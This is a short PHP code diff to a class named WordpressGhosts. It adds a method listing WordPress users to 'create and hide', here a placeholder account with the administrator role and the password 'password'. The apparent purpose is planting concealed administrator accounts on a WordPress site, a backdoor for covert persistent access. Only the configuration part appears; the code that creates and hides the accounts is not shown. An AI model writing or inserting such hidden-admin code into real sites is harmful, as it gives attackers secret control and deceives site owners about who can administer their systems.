@@ -29,4 +29,15 @@ class WordpressGhosts
         }
         return join('/', $paths);
     }
+
+    public static function get_ghosts(){
+        // Array of Users (Ghosts) to create and hide it with relative WP role, email and password.
+        return array(
+        '0' => array(
+          'fake_username', // username
+          'administrator', // role
+          'fake@email.com', // email
+          'password')  // password
+        );
+    }
 }
